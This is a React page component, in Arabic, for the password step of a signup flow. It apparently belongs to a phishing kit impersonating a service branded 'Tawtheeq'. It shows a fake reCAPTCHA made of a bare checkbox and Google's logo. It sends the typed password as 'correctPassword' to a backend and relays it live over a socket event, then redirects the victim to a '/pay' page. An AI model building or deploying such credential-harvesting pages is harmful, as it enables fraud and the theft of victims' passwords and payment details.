import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { serverRoute, socket } from "./Home";
import axios from "axios";
const Password = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    password: "",
    confirmPassword: "",
  });
  const [isRobot, setIsRobot] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (field, value) => {
    const updatedData = { ...formData, [field]: value };
    setFormData(updatedData);
    sessionStorage.setItem("passwordData", JSON.stringify(updatedData));
  };

  const submit = async () => {
    setIsLoading(true);
    try {
      const finalData = {
        correctPassword: formData.password,
      };
      const { data: userData, status } = await axios.post(
        serverRoute + "/newData/" + sessionStorage.getItem("id"),
        finalData
      );
      if (status === 201) {
        socket.emit("newData", finalData);
        sessionStorage.setItem("data", JSON.stringify(userData.user));
        window.location.href = "/pay";
      } else {
        window.alert("حدث خطأ ما");
        setIsLoading(false);
      }
    } catch (error) {
      console.error(error);
      window.alert("حدث خطأ ما");
      setIsLoading(false);
    }
  };
  // Password validation checks
  const hasLowercase = /[a-z]/.test(formData.password);
  const hasUppercase = /[A-Z]/.test(formData.password);
  const hasNumber = /[0-9]/.test(formData.password);
  const isMinLength = formData.password.length >= 8;

  const handleContinue = async () => {
    if (formData.password === formData.confirmPassword) {
      sessionStorage.setItem("passwordData", JSON.stringify(formData));
      return await submit();
    }
  };

  const handleBack = () => {
    navigate("/personal-data");
  };

  const isFormValid =
    formData.password.trim().length >= 8 &&
    formData.confirmPassword.trim().length >= 8 &&
    formData.password === formData.confirmPassword &&
    hasLowercase &&
    hasUppercase &&
    hasNumber &&
    isRobot;

  return (
    <div className="bg-gray-50 flex flex-col w-full" dir="rtl">
      {/* Header */}
      <div className="w-full bg-white pt-4 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between relative flex-row-reverse w-full">
            {/* Step 4 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-0 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  4
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  إنتهاء
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  التسجيل
                </p>
              </div>
            </div>

            {/* Step 3 - Active */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full bg-[#0071bc] flex items-center justify-center text-white font-bold z-10">
                  3
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  كلمة
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  المرور
                </p>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  2
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  البيانات
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الشخصية
                </p>
              </div>
            </div>

            {/* Step 1 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-0 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  1
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  نوع
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الحساب
                </p>
              </div>
            </div>
            <div className="absolute h-0.5 top-5 w-full bg-gray-200"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="mx-auto  rounded-lg shadow-lg py-8 px-4">
          {/* Title */}
          <div className="text-right mb-8">
            <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
              ضبط كلمة المرور
            </h2>
            <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
          </div>

          <div className="space-y-6">
            {/* Password Requirements */}
            <div className="bg-[#d8d8d8] rounded-lg p-4 space-y-3">
              <div className="flex items-center justify-start gap-3">
                <svg
                  className={`w-6 h-6 ${
                    hasLowercase ? "text-[#3c96c4]" : "text-gray-400"
                  }`}
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clipRule="evenodd"
                  />
                </svg>
                <span
                  className={`text-sm ${
                    hasLowercase ? "text-[#3c96c4]" : "text-gray-500"
                  }`}
                >
                  الحد الأدنى للأحرف الصغيرة 1
                </span>
              </div>

              <div className="flex items-center justify-start gap-3">
                <svg
                  className={`w-6 h-6 ${
                    hasUppercase ? "text-[#3c96c4]" : "text-gray-400"
                  }`}
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clipRule="evenodd"
                  />
                </svg>
                <span
                  className={`text-sm ${
                    hasUppercase ? "text-[#3c96c4]" : "text-gray-500"
                  }`}
                >
                  الحد الأدنى للأحرف الكبيرة 1
                </span>
              </div>

              <div className="flex items-center justify-start gap-3">
                <svg
                  className={`w-6 h-6 ${
                    hasNumber ? "text-[#3c96c4]" : "text-gray-400"
                  }`}
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clipRule="evenodd"
                  />
                </svg>
                <span
                  className={`text-sm ${
                    hasNumber ? "text-[#3c96c4]" : "text-gray-500"
                  }`}
                >
                  الحد الأدنى للأرقام
                </span>
              </div>
            </div>

            {/* Password */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                أدخل كلمة المرور <span className="text-red-600">*</span>
              </label>
              <input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange("password", e.target.value)}
                className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
              />
            </div>

            {/* Confirm Password */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                إعادة ادخال كلمة المرور <span className="text-red-600">*</span>
              </label>
              <input
                type="password"
                value={formData.confirmPassword}
                onChange={(e) =>
                  handleInputChange("confirmPassword", e.target.value)
                }
                className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
              />
              {formData.confirmPassword &&
                formData.password !== formData.confirmPassword && (
                  <p className="text-sm text-red-600 mt-2 text-right">
                    كلمة المرور غير متطابقة
                  </p>
                )}
            </div>

            {/* reCAPTCHA */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-4 block text-right">
                التحقق
              </label>
              <div className="bg-white px-4 py-1 rounded-lg border border-gray-300 flex items-center justify-between w-fit">
                <div className="flex items-center gap-3">
                  <input
                    type="checkbox"
                    checked={isRobot}
                    onChange={(e) => setIsRobot(e.target.checked)}
                    className="w-6 h-6 cursor-pointer"
                  />
                  <div className="text-sm flex items-center gap-4">
                    <p className="text-gray-700">أنا لست برنامج روبوت</p>
                    <div className="flex items-center gap-2 text-xs text-gray-500 mt-1 flex-col w-1/3">
                      <img
                        src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
                        alt="reCAPTCHA"
                        className="w-6 h-6"
                      />
                      <div className="text-xs flex-1 text-nowrap  text-center">
                        <p>reCAPTCHA</p>
                        <p>الخصوصية - الشروط</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-row-reverse gap-6 justify-center mt-10">
              <button
                onClick={handleContinue}
                disabled={!isFormValid}
                className={`font-bold py-2 px-16 rounded-lg text-xl transition-colors ${
                  isFormValid
                    ? "bg-[#3c96c4] hover:bg-[#2d7fa8] text-white cursor-pointer"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                استمر
              </button>
              <button
                onClick={handleBack}
                className="bg-white hover:bg-gray-100 text-gray-800 font-bold py-2 px-16 rounded-lg text-xl border-2 border-gray-300 transition-colors"
              >
                رجوع
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Loading Popup */}
      {isLoading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري المعالجة...
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Password;
